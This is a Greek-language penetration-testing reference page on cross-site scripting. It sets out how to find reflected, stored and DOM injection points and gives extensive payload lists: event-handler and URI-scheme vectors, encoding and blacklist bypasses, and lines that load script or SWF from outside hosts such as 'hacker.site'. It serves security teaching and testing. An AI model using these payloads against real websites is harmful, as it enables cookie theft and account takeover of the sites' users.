# XSS (Cross Site Scripting)

{{#include ../../banners/hacktricks-training.md}}

## Μεθοδολογία

1. Έλεγξε αν **κάποια τιμή που ελέγχεις** (_parameters_, _path_, _headers_?, _cookies_?) **ανακλάται** στο HTML ή **χρησιμοποιείται** από κώδικα **JS**.
2. **Βρες το πλαίσιο** όπου ανακλάται/χρησιμοποιείται.
3. Αν **ανακλάται**
1. Έλεγξε **ποια σύμβολα μπορείς να χρησιμοποιήσεις** και αναλόγως προετοίμασε το payload:
1. Σε **ακατέργαστο HTML**:
1. Μπορείς να δημιουργήσεις νέα HTML tags;
2. Μπορείς να χρησιμοποιήσεις events ή attributes που υποστηρίζουν το πρωτόκολλο `javascript:` ;
3. Μπορείς να παρακάμψεις προστασίες;
4. Ερμηνεύεται το HTML περιεχόμενο από κάποια client side JS engine (_AngularJS_, _VueJS_, _Mavo_...), που θα μπορούσες να εκμεταλλευτείς μια [**Client Side Template Injection**](../client-side-template-injection-csti.md).
5. Αν δε μπορείς να δημιουργήσεις HTML tags που εκτελούν JS κώδικα, μπορείς να εκμεταλλευτείς ένα [**Dangling Markup - HTML scriptless injection**](../dangling-markup-html-scriptless-injection/index.html);
2. Μέσα σε μια **ετικέτα HTML**:
1. Μπορείς να βγεις στο raw HTML context;
2. Μπορείς να δημιουργήσεις νέα events/attributes για να εκτελέσεις JS κώδικα;
3. Το attribute όπου έχεις παγιδευτεί υποστηρίζει εκτέλεση JS;
4. Μπορείς να παρακάμψεις προστασίες;
3. Μέσα σε **JavaScript κώδικα**:
1. Μπορείς να ξεφύγεις από το `<script>` tag;
2. Μπορείς να ξεφύγεις από το string και να εκτελέσεις διαφορετικό JS κώδικα;
3. Είναι η είσοδός σου σε template literals `` ``;
4. Μπορείς να παρακάμψεις προστασίες;
4. Javascript **function** που **εκτελείται**
1. Μπορείς να υποδείξεις το όνομα της function προς εκτέλεση. π.χ.: `?callback=alert(1)`
4. Αν **χρησιμοποιείται**:
1. Μπορείς να εκμεταλλευτείς ένα **DOM XSS**, πρόσεξε πώς ελέγχεται η είσοδός σου και αν η **ελεγχόμενη είσοδος χρησιμοποιείται από κάποιο sink.**

Όταν εργάζεσαι πάνω σε ένα σύνθετο XSS, μπορεί να σε ενδιαφέρει να γνωρίζεις:


{{#ref}}
debugging-client-side-js.md
{{#endref}}

## Ανακλώμενες τιμές

Για να εκμεταλλευτείς επιτυχώς ένα XSS, το πρώτο που πρέπει να βρεις είναι μια **τιμή που ελέγχεις και ανακλάται** στη σελίδα.

- **Intermediately reflected**: Αν διαπιστώσεις ότι η τιμή ενός parameter ή ακόμα και του path ανακλάται στη σελίδα, μπορείς να εκμεταλλευτείς ένα **Reflected XSS**.
- **Stored and reflected**: Αν μια τιμή που ελέγχεις αποθηκεύεται στον server και ανακλάται κάθε φορά που ανοίγεις μια σελίδα, μπορείς να εκμεταλλευτείς ένα **Stored XSS**.
- **Accessed via JS**: Αν μια τιμή που ελέγχεις προσπελάζεται χρησιμοποιώντας JS, μπορείς να εκμεταλλευτείς ένα **DOM XSS**.

## Πλαίσια (Contexts)

Όταν προσπαθείς να εκμεταλλευτείς ένα XSS, το πρώτο που πρέπει να ξέρεις είναι **πού ανακλάται η είσοδός σου**. Ανάλογα με το πλαίσιο, θα μπορείς να εκτελέσεις αυθαίρετο JS κώδικα με διαφορετικούς τρόπους.

### Raw HTML

Αν η είσοδός σου **ανακλάται στο raw HTML**, θα χρειαστεί να εκμεταλλευτείς κάποια **ετικέτα HTML** για να εκτελέσεις JS κώδικα: `<img , <iframe , <svg , <script` ... αυτές είναι μόνο μερικές από τις πολλές πιθανές ετικέτες που μπορείς να χρησιμοποιήσεις.\
Επίσης, κράτα στο μυαλό σου την [Client Side Template Injection](../client-side-template-injection-csti.md).

### Μέσα σε attributes ετικέτας HTML

Αν η είσοδός σου ανακλάται μέσα στην τιμή ενός attribute μιας ετικέτας, μπορείς να δοκιμάσεις:

1. Να **δραπετεύσεις από το attribute και από την ετικέτα** (τότε θα βρεθείς στο raw HTML) και να δημιουργήσεις νέα HTML tag προς εκμετάλλευση: `"><img [...]`
2. Αν **μπορείς να δραπετεύσεις από το attribute αλλά όχι από την ετικέτα** (`>` κωδικοποιείται ή διαγράφεται), ανάλογα με την ετικέτα μπορείς να **δημιουργήσεις ένα event** που εκτελεί JS κώδικα: `" autofocus onfocus=alert(1) x="`
3. Αν **δεν μπορείς να δραπετεύσεις από το attribute** (`"` κωδικοποιείται ή διαγράφεται), τότε ανάλογα **σε ποιο attribute** ανακλάται η τιμή σου και **αν ελέγχεις όλη την τιμή ή μόνο ένα μέρος**, θα μπορείς να το εκμεταλλευτείς. Για **παράδειγμα**, αν ελέγχεις ένα event όπως `onclick=` θα μπορείς να το κάνεις να εκτελέσει αυθαίρετο κώδικα όταν γίνει κλικ. Ένα άλλο ενδιαφέρον **παράδειγμα** είναι το attribute `href`, όπου μπορείς να χρησιμοποιήσεις το πρωτόκολλο `javascript:` για να εκτελέσεις αυθαίρετο κώδικα: **`href="javascript:alert(1)"`**
4. Αν η είσοδός σου ανακλάται μέσα σε "**μη εκμεταλλεύσιμες ετικέτες**", μπορείς να δοκιμάσεις το κόλπο με το **`accesskey`** για να εκμεταλλευτείς το vuln (θα χρειαστείτε κάποιο είδος social engineering για να το εκμεταλλευτείτε): **`" accesskey="x" onclick="alert(1)" x="`**

Παράδειγμα περίεργο όπου το Angular εκτελεί XSS αν ελέγχεις ένα class name:
```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```
### Μέσα σε JavaScript κώδικα

Σε αυτή την περίπτωση η είσοδός σας αντανακλάται ανάμεσα στις **`<script> [...] </script>`** ετικέτες μιας σελίδας HTML, μέσα σε ένα αρχείο `.js` ή μέσα σε ένα attribute που χρησιμοποιεί το πρωτόκολλο **`javascript:`**:

- Αν αντανακλάται ανάμεσα σε **`<script> [...] </script>`** ετικέτες, ακόμα κι αν η είσοδός σας βρίσκεται μέσα σε οποιοδήποτε είδος quotes, μπορείτε να προσπαθήσετε να εισάγετε `</script>` και να διαφύγετε από αυτό το πλαίσιο. Αυτό λειτουργεί επειδή το πρόγραμμα περιήγησης θα αναλύσει πρώτα τις HTML ετικέτες και μετά το περιεχόμενο, επομένως δεν θα παρατηρήσει ότι η εισαγμένη `</script>` ετικέτα βρίσκεται μέσα στον HTML κώδικα.
- Αν αντανακλάται **μέσα σε μια JS string** και το τελευταίο κόλπο δεν λειτουργεί, θα χρειαστεί να **βγείτε** από το string, να **εκτελέσετε** τον κώδικά σας και να **αναδομήσετε** τον JS κώδικα (αν υπάρχει οποιοδήποτε σφάλμα, δεν θα εκτελεστεί:
- `'-alert(1)-'`
- `';-alert(1)//`
- `\';alert(1)//`
- Αν αντανακλάται μέσα σε template literals μπορείτε να **ενσωματώσετε JS εκφράσεις** χρησιμοποιώντας τη σύνταξη `${ ... }`: `` var greetings = `Hello, ${alert(1)}` ``
- **Unicode encode** λειτουργεί για να γράψετε **valid javascript code**:
```javascript
alert(1)
alert(1)
alert(1)
```
#### Javascript Hoisting

Javascript Hoisting αναφέρεται στην ευκαιρία να **δηλώσεις functions, variables ή classes μετά τη χρήση τους ώστε να εκμεταλλευτείς σενάρια όπου ένα XSS χρησιμοποιεί μη δηλωμένες variables ή functions.**\
**Δες την παρακάτω σελίδα για περισσότερες πληροφορίες:**


{{#ref}}
js-hoisting.md
{{#endref}}

### Javascript Function

Πολλές ιστοσελίδες έχουν endpoints που **δέχονται ως παράμετρο το όνομα της function που θα εκτελεστεί**. Ένα κοινό παράδειγμα που συναντάται στην πράξη είναι κάτι σαν: `?callback=callbackFunc`.

Ένας καλός τρόπος να διαπιστώσεις αν κάτι που δίνεται απευθείας από τον χρήστη προσπαθεί να εκτελεστεί είναι **η αλλαγή της τιμής της παραμέτρου** (π.χ. σε 'Vulnerable') και η αναζήτηση στο console για σφάλματα όπως:

![](<../../images/image (711).png>)

Σε περίπτωση που είναι vulnerable, μπορείς να **προκαλέσεις ένα alert** απλά στέλνοντας την τιμή: **`?callback=alert(1)`**. Ωστόσο, είναι πολύ συνηθισμένο αυτά τα endpoints να **validate το περιεχόμενο** ώστε να επιτρέπουν μόνο γράμματα, αριθμούς, τελείες και underscores (**`[\w\._]`**).

Ωστόσο, ακόμα και με αυτόν τον περιορισμό είναι δυνατή η εκτέλεση ορισμένων ενεργειών. Αυτό συμβαίνει γιατί μπορείς να χρησιμοποιήσεις αυτούς τους επιτρεπτούς χαρακτήρες για να **προσπελάσεις οποιοδήποτε στοιχείο στο DOM**:

![](<../../images/image (747).png>)

Μερικές χρήσιμες functions για αυτό:
```
firstElementChild
lastElementChild
nextElementSibiling
lastElementSibiling
parentElement
```
Μπορείτε επίσης να δοκιμάσετε να **trigger Javascript functions** απευθείας: `obj.sales.delOrders`.

Ωστόσο, συνήθως τα endpoints που εκτελούν την ενδεικνυόμενη συνάρτηση είναι endpoints χωρίς ιδιαίτερο ενδιαφέρον στο DOM, **άλλες σελίδες στην ίδια προέλευση** θα έχουν ένα **πιο ενδιαφέρον DOM** για να εκτελέσετε περισσότερες ενέργειες.

Επομένως, προκειμένου να **abuse this vulnerability in a different DOM** αναπτύχθηκε η εκμετάλλευση **Same Origin Method Execution (SOME)**:


{{#ref}}
some-same-origin-method-execution.md
{{#endref}}

### DOM

Υπάρχει **JS code** που χρησιμοποιεί **ανασφαλώς** κάποια **δεδομένα ελεγχόμενα από έναν attacker** όπως `location.href`. Ένας attacker μπορεί να το εκμεταλλευτεί για να εκτελέσει αυθαίρετο JS code.


{{#ref}}
dom-xss.md
{{#endref}}

### **Universal XSS**

Αυτός ο τύπος XSS μπορεί να βρεθεί **οπουδήποτε**. Δεν εξαρτώνται μόνο από την εκμετάλλευση του client μιας web εφαρμογής αλλά από **οποιοδήποτε** **context**. Αυτός ο τύπος **arbitrary JavaScript execution** μπορεί ακόμα να χρησιμοποιηθεί για να αποκτήσει **RCE**, να **διαβάσει** **αυθαίρετα** **αρχεία** σε clients και servers, και άλλα.\
Μερικά **παραδείγματα**:


{{#ref}}
server-side-xss-dynamic-pdf.md
{{#endref}}


{{#ref}}
../../network-services-pentesting/pentesting-web/electron-desktop-apps/
{{#endref}}

## WAF bypass encoding image

![from https://twitter.com/hackerscrolls/status/1273254212546281473?s=21](<../../images/EauBb2EX0AERaNK (1).jpg>)

## Injecting inside raw HTML

Όταν το input σας αντανακλάται **μέσα στην HTML σελίδα** ή μπορείτε να διαφύγετε και να εγχύσετε HTML κώδικα σε αυτό το context, το **πρώτο** πράγμα που πρέπει να κάνετε είναι να ελέγξετε αν μπορείτε να καταχραστείτε το `<` για να δημιουργήσετε νέα tags: Απλά δοκιμάστε να **reflect** αυτόν τον **char** και ελέγξτε αν γίνεται **HTML encoded** ή **διαγράφεται** ή αν **αντανακλάται χωρίς αλλαγές**. **Μόνο στην τελευταία περίπτωση θα μπορείτε να εκμεταλλευτείτε αυτή την περίπτωση**.\
Για αυτές τις περιπτώσεις επίσης **έχετε υπόψη** [**Client Side Template Injection**](../client-side-template-injection-csti.md)**.**\
_**Σημείωση: A HTML comment can be closed using\*\***\***\*`-->`\*\***\***\*or \*\***`--!>`\*\**_

Σε αυτή την περίπτωση και αν δεν χρησιμοποιείται black/whitelisting, μπορείτε να χρησιμοποιήσετε payloads όπως:
```html
<script>
alert(1)
</script>
<img src="x" onerror="alert(1)" />
<svg onload=alert('XSS')>
```
Ωστόσο, αν χρησιμοποιείται black/whitelisting για tags/attributes, θα χρειαστεί να κάνετε **brute-force** για να βρείτε ποιες tags μπορείτε να δημιουργήσετε.\  
Μόλις **εντοπίσετε ποιες tags επιτρέπονται**, θα πρέπει να **brute-force attributes/events** εντός των έγκυρων tags που βρήκατε, για να δείτε πώς μπορείτε να επιτεθείτε στο context.

### Tags/Events brute-force

Μεταβείτε στο [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) και κάντε κλικ στο _**Copy tags to clipboard**_. Στη συνέχεια, στείλτε όλα αυτά χρησιμοποιώντας Burp intruder και ελέγξτε αν κάποια tags δεν αναγνωρίστηκαν ως κακόβουλα από το WAF. Μόλις ανακαλύψετε ποιες tags μπορείτε να χρησιμοποιήσετε, μπορείτε να **brute force all the events** χρησιμοποιώντας τα έγκυρα tags (στην ίδια σελίδα κάντε κλικ στο _**Copy events to clipboard**_ και ακολουθήστε την ίδια διαδικασία όπως πριν).

### Custom tags

Αν δεν βρήκατε κάποιο έγκυρο HTML tag, μπορείτε να δοκιμάσετε να **δημιουργήσετε ένα custom tag** και να εκτελέσετε JS code με το attribute `onfocus`. Στο XSS request, πρέπει να τελειώσετε το URL με `#` για να κάνετε τη σελίδα να **focus on that object** και να **execute** τον κώδικα:
```
/?search=<xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1>#x
```
### Παρακάμψεις blacklist

Αν χρησιμοποιείται κάποια μορφή blacklist, μπορείς να προσπαθήσεις να την παρακάμψεις με μερικά χαζά κόλπα:
```javascript
//Random capitalization
<script> --> <ScrIpT>
<img --> <ImG

//Double tag, in case just the first match is removed
<script><script>
<scr<script>ipt>
<SCRscriptIPT>alert(1)</SCRscriptIPT>

//You can substitude the space to separate attributes for:
/
/*%00/
/%00*/
%2F
%0D
%0C
%0A
%09

//Unexpected parent tags
<svg><x><script>alert('1'&#41</x>

//Unexpected weird attributes
<script x>
<script a="1234">
<script ~~~>
<script/random>alert(1)</script>
<script      ///Note the newline
>alert(1)</script>
<scr\x00ipt>alert(1)</scr\x00ipt>

//Not closing tag, ending with " <" or " //"
<iframe SRC="javascript:alert('XSS');" <
<iframe SRC="javascript:alert('XSS');" //

//Extra open
<<script>alert("XSS");//<</script>

//Just weird an unexpected, use your imagination
<</script/script><script>
<input type=image src onerror="prompt(1)">

//Using `` instead of parenthesis
onerror=alert`1`

//Use more than one
<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //
```
### Length bypass (small XSSs)

> [!NOTE] > **Περισσότερα tiny XSS για διαφορετικά περιβάλλοντα** payload [**can be found here**](https://github.com/terjanq/Tiny-XSS-Payloads) and [**here**](https://tinyxss.terjanq.me).
```html
<!-- Taken from the blog of Jorge Lajara -->
<svg/onload=alert``> <script src=//aa.es> <script src=//℡㏛.pw>
```
Το τελευταίο χρησιμοποιεί 2 χαρακτήρες unicode που επεκτείνονται σε 5: telsr\  
Περισσότεροι από αυτούς τους χαρακτήρες μπορούν να βρεθούν [here](https://www.unicode.org/charts/normalization/).\
Για να ελέγξετε σε ποιους χαρακτήρες αποσυντίθενται δείτε [here](https://www.compart.com/en/unicode/U+2121).

### Click XSS - Clickjacking

Αν για να εκμεταλλευτείτε την ευπάθεια χρειάζεται ο **χρήστης να κάνει κλικ σε ένα σύνδεσμο ή σε μία φόρμα** με προ-συμπληρωμένα δεδομένα, μπορείτε να δοκιμάσετε να [**abuse Clickjacking**](../clickjacking.md#xss-clickjacking) (αν η σελίδα είναι ευάλωτη).

### Αδύνατο - Dangling Markup

Αν νομίζετε απλώς ότι **είναι αδύνατο να δημιουργήσετε ένα HTML tag με ένα attribute για να εκτελέσει JS code**, θα πρέπει να δείτε [**Danglig Markup** ](../dangling-markup-html-scriptless-injection/index.html) γιατί θα μπορούσατε να **exploit** την ευπάθεια **χωρίς** να εκτελέσετε **JS** code.

## Εισαγωγή μέσα σε HTML tag

### Μέσα στο tag/escaping from attribute value

Αν βρίσκεστε **μέσα σε ένα HTML tag**, το πρώτο που μπορείτε να δοκιμάσετε είναι να **escape** από το tag και να χρησιμοποιήσετε μερικές από τις τεχνικές που αναφέρονται στην [previous section](#injecting-inside-raw-html) για να εκτελέσετε **JS** code.\
Αν **δεν μπορείτε να escape από το tag**, μπορείτε να δημιουργήσετε νέα attributes μέσα στο tag για να προσπαθήσετε να εκτελέσετε **JS** code, για παράδειγμα χρησιμοποιώντας κάποιο payload όπως (_σημείωση ότι σε αυτό το παράδειγμα τα double quotes χρησιμοποιούνται για να escape από το attribute, δεν θα τα χρειαστείτε αν το input σας αντικατοπτρίζεται απευθείας μέσα στο tag_):
```bash
" autofocus onfocus=alert(document.domain) x="
" onfocus=alert(1) id=x tabindex=0 style=display:block>#x #Access http://site.com/?#x t
```
**Συμβάντα στυλ**
```python
<p style="animation: x;" onanimationstart="alert()">XSS</p>
<p style="animation: x;" onanimationend="alert()">XSS</p>

#ayload that injects an invisible overlay that will trigger a payload if anywhere on the page is clicked:
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.5);z-index: 5000;" onclick="alert(1)"></div>
#moving your mouse anywhere over the page (0-click-ish):
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.0);z-index: 5000;" onmouseover="alert(1)"></div>
```
### Μέσα στο attribute

Ακόμη και αν **δεν μπορείτε να ξεφύγετε από το attribute** (`"` κωδικοποιείται ή διαγράφεται), ανάλογα με **ποιο attribute** εμφανίζεται η τιμή σας **και αν ελέγχετε ολόκληρη την τιμή ή μόνο ένα μέρος της**, θα μπορείτε να το εκμεταλλευτείτε. Για **παράδειγμα**, αν ελέγχετε ένα event όπως `onclick=` θα μπορείτε να το κάνετε να εκτελέσει αυθαίρετο κώδικα όταν γίνει κλικ.\
Ένα ακόμη ενδιαφέρον **παράδειγμα** είναι το attribute `href`, όπου μπορείτε να χρησιμοποιήσετε το πρωτόκολλο `javascript:` για να εκτελέσετε αυθαίρετο κώδικα: **`href="javascript:alert(1)"`**

**Bypass inside event using HTML encoding/URL encode**

Οι **HTML encoded characters** μέσα στην τιμή των attributes των HTML tags **αποκωδικοποιούνται κατά το runtime**. Επομένως κάτι σαν το παρακάτω θα είναι έγκυρο (το payload είναι με έντονα): `<a id="author" href="http://none" onclick="var tracker='http://foo?`**`&apos;-alert(1)-&apos;`**`';">Go Back </a>`

Σημειώστε ότι **οποιοσδήποτε τύπος HTML encode είναι έγκυρος**:
```javascript
//HTML entities
&apos;-alert(1)-&apos;
//HTML hex without zeros
&#x27-alert(1)-&#x27
//HTML hex with zeros
&#x00027-alert(1)-&#x00027
//HTML dec without zeros
&#39-alert(1)-&#39
//HTML dec with zeros
&#00039-alert(1)-&#00039

<a href="javascript:var a='&apos;-alert(1)-&apos;'">a</a>
<a href="&#106;avascript:alert(2)">a</a>
<a href="jav&#x61script:alert(3)">a</a>
```
**Σημειώστε ότι το URL encode θα λειτουργήσει επίσης:**
```python
<a href="https://example.com/lol%22onmouseover=%22prompt(1);%20img.png">Click</a>
```
**Bypass μέσα σε event χρησιμοποιώντας Unicode encode**
```javascript
//For some reason you can use unicode to encode "alert" but not "(1)"
<img src onerror=\u0061\u006C\u0065\u0072\u0074(1) />
<img src onerror=\u{61}\u{6C}\u{65}\u{72}\u{74}(1) />
```
### Ειδικά πρωτόκολλα εντός του attribute

Εκεί μπορείτε να χρησιμοποιήσετε τα πρωτόκολλα **`javascript:`** ή **`data:`** σε ορισμένα μέρη για να **εκτελέσετε αυθαίρετο JS κώδικα**. Κάποια θα απαιτούν αλληλεπίδραση χρήστη, κάποια όχι.
```javascript
javascript:alert(1)
JavaSCript:alert(1)
javascript:%61%6c%65%72%74%28%31%29 //URL encode
javascript&colon;alert(1)
javascript&#x003A;alert(1)
javascript&#58;alert(1)
javascript:alert(1)
java        //Note the new line
script:alert(1)

data:text/html,<script>alert(1)</script>
DaTa:text/html,<script>alert(1)</script>
data:text/html;charset=iso-8859-7,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
data:text/html;charset=UTF-8,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
data:text/html;charset=thing;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg
data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==
```
**Τοποθεσίες όπου μπορείτε να εισάγετε αυτά τα πρωτόκολλα**

**Γενικά** το πρωτόκολλο `javascript:` μπορεί να **χρησιμοποιηθεί σε οποιοδήποτε tag που δέχεται το attribute `href`** και σε **τα περισσότερα** από τα tag που δέχονται το **attribute `src`** (αλλά όχι `<img>`)
```html
<a href="javascript:alert(1)">
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
<form action="javascript:alert(1)"><button>send</button></form>
<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
<object data=javascript:alert(3)>
<iframe src=javascript:alert(2)>
<embed src=javascript:alert(1)>

<object data="data:text/html,<script>alert(5)</script>">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>
<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>
<iframe src="data:text/html,<script>alert(5)</script>"></iframe>

//Special cases
<object data="//hacker.site/xss.swf"> .//https://github.com/evilcos/xss.swf
<embed code="//hacker.site/xss.swf" allowscriptaccess=always> //https://github.com/evilcos/xss.swf
<iframe srcdoc="<svg onload=alert(4);>">
```
**Άλλα obfuscation tricks**

_**Σε αυτή την περίπτωση το HTML encoding και το Unicode encoding trick από την προηγούμενη ενότητα ισχύουν επίσης, καθώς βρίσκεστε μέσα σε ένα attribute.**_
```javascript
<a href="javascript:var a='&apos;-alert(1)-&apos;'">
```
Επιπλέον, υπάρχει ένα ακόμη **ωραίο κόλπο** για αυτές τις περιπτώσεις: **Ακόμα κι αν η είσοδός σας μέσα στο `javascript:...` κωδικοποιείται στο URL, θα αποκωδικοποιηθεί πριν εκτελεστεί.** Έτσι, αν χρειάζεται να **διαφύγετε** από το **αλφαριθμητικό** χρησιμοποιώντας ένα **απόστροφο** και βλέπετε ότι **κωδικοποιείται στο URL**, θυμηθείτε ότι **δεν έχει σημασία,** θα **ερμηνευτεί** ως **απόστροφο** κατά τον **χρόνο εκτέλεσης**.
```javascript
&apos;-alert(1)-&apos;
%27-alert(1)-%27
<iframe src=javascript:%61%6c%65%72%74%28%31%29></iframe>
```
Σημειώστε ότι αν προσπαθήσετε να **χρησιμοποιήσετε και τα δύο** `URLencode + HTMLencode` με οποιαδήποτε σειρά για να κωδικοποιήσετε το **payload** δεν θα **λειτουργήσει**, αλλά μπορείτε να **τα αναμείξετε μέσα στο payload**.

**Χρήση Hex και Octal encode με `javascript:`**

Μπορείτε να χρησιμοποιήσετε **Hex** και **Octal encode** μέσα στο attribute `src` του `iframe` (τουλάχιστον) για να δηλώσετε **HTML tags to execute JS**:
```javascript
//Encoded: <svg onload=alert(1)>
// This WORKS
<iframe src=javascript:'\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e' />
<iframe src=javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76' />

//Encoded: alert(1)
// This doesn't work
<svg onload=javascript:'\x61\x6c\x65\x72\x74\x28\x31\x29' />
<svg onload=javascript:'\141\154\145\162\164\50\61\51' />
```
### Reverse tab nabbing
```javascript
<a target="_blank" rel="opener"
```
Αν μπορείτε να εισάγετε οποιοδήποτε URL σε μια αυθαίρετη **`<a href=`** ετικέτα που περιέχει τα **`target="_blank" and rel="opener"`** attributes, ελέγξτε την **παρακάτω σελίδα για να εκμεταλλευτείτε αυτή τη συμπεριφορά**:


{{#ref}}
../reverse-tab-nabbing.md
{{#endref}}

### Παράκαμψη on Event Handlers

Καταρχάς ελέγξτε αυτή τη σελίδα ([https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)) για χρήσιμα **"on" event handlers**.\
Σε περίπτωση που υπάρχει κάποια blacklist που σας εμποδίζει από το να δημιουργήσετε αυτούς τους event handlers, μπορείτε να δοκιμάσετε τις παρακάτω παρακάμψεις:
```javascript
<svg onload%09=alert(1)> //No safari
<svg %09onload=alert(1)>
<svg %09onload%20=alert(1)>
<svg onload%09%20%28%2c%3b=alert(1)>

//chars allowed between the onevent and the "="
IExplorer: %09 %0B %0C %020 %3B
Chrome: %09 %20 %28 %2C %3B
Safari: %2C %3B
Firefox: %09 %20 %28 %2C %3B
Opera: %09 %20 %2C %3B
Android: %09 %20 %28 %2C %3B
```
### XSS σε "Unexploitable tags" (hidden input, link, canonical, meta)

Από [**εδώ**](https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags) **τώρα είναι δυνατό να εκμεταλλευτείτε hidden inputs με:**
```html
<button popvertarget="x">Click me</button>
<input type="hidden" value="y" popover id="x" onbeforetoggle="alert(1)" />
```
Και σε **meta tags**:
```html
<!-- Injection inside meta attribute-->
<meta
name="apple-mobile-web-app-title"
content=""
Twitter
popover
id="newsletter"
onbeforetoggle="alert(2)" />
<!-- Existing target-->
<button popovertarget="newsletter">Subscribe to newsletter</button>
<div popover id="newsletter">Newsletter popup</div>
```
Από [**here**](https://portswigger.net/research/xss-in-hidden-input-fields): Μπορείτε να εκτελέσετε ένα **XSS payload μέσα σε ένα hidden attribute**, εφόσον μπορέσετε να **πείσετε** το **θύμα** να πατήσει τον **συνδυασμό πλήκτρων**. Στον Firefox σε Windows/Linux ο συνδυασμός πλήκτρων είναι **ALT+SHIFT+X** και σε OS X είναι **CTRL+ALT+X**. Μπορείτε να ορίσετε διαφορετικό συνδυασμό πλήκτρων χρησιμοποιώντας διαφορετικό πλήκτρο στο accesskey attribute. Εδώ είναι το vector:
```html
<input type="hidden" accesskey="X" onclick="alert(1)">
```
**Το XSS payload θα είναι κάτι σαν αυτό: `" accesskey="x" onclick="alert(1)" x="`**

### Blacklist Bypasses

Πολλά κόλπα με τη χρήση διαφορετικών κωδικοποιήσεων έχουν ήδη εκτεθεί μέσα σε αυτή την ενότητα. Επιστρέψτε **για να μάθετε πού μπορείτε να χρησιμοποιήσετε:**

- **HTML encoding (HTML tags)**
- **Unicode encoding (can be valid JS code):** `\u0061lert(1)`
- **URL encoding**
- **Hex and Octal encoding**
- **data encoding**

**Bypasses for HTML tags and attributes**

Διαβάστε την[ Blacklist Bypasses of the previous section](#blacklist-bypasses).

**Bypasses for JavaScript code**

Διαβάστε την J[avaScript bypass blacklist of the following section](#javascript-bypass-blacklists-techniques).

### CSS-Gadgets

Αν βρείτε ένα **XSS σε ένα πολύ μικρό μέρος** της σελίδας που απαιτεί κάποιο είδος αλληλεπίδρασης (ίσως ένας μικρός σύνδεσμος στο footer με ένα στοιχείο onmouseover), μπορείτε να προσπαθήσετε να **μεταβάλετε τον χώρο που καταλαμβάνει το στοιχείο** για να μεγιστοποιήσετε τις πιθανότητες να ενεργοποιηθεί ο σύνδεσμος.

Για παράδειγμα, μπορείτε να προσθέσετε κάποια styling στο στοιχείο όπως: `position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: red; opacity: 0.5`

Αλλά, αν το WAF φιλτράρει το style attribute, μπορείτε να χρησιμοποιήσετε CSS Styling Gadgets, οπότε αν βρείτε, για παράδειγμα

> .test {display:block; color: blue; width: 100%\}

και

> \#someid {top: 0; font-family: Tahoma;}

Τώρα μπορείτε να τροποποιήσετε τον σύνδεσμό μας και να τον φέρετε στη μορφή

> \<a href="" id=someid class=test onclick=alert() a="">

Αυτό το κόλπο προέρχεται από [https://medium.com/@skavans\_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703](https://medium.com/@skavans_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703)

## Εισαγωγή μέσα στον κώδικα JavaScript

Σε αυτές τις περιπτώσεις το **input** σας θα αντανακλάται μέσα στον JS κώδικα ενός `.js` αρχείου ή μεταξύ `<script>...</script>` tags ή μεταξύ HTML events που μπορούν να εκτελέσουν JS code ή μεταξύ attributes που δέχονται το `javascript:` protocol.

### Διαφυγή του \<script> tag

Αν ο κώδικάς σας εισάγεται μέσα σε `<script> [...] var input = 'reflected data' [...] </script>` μπορείτε εύκολα να **σπάσετε το κλείσιμο της `<script>` ετικέτας**:
```javascript
</script><img src=1 onerror=alert(document.domain)>
```
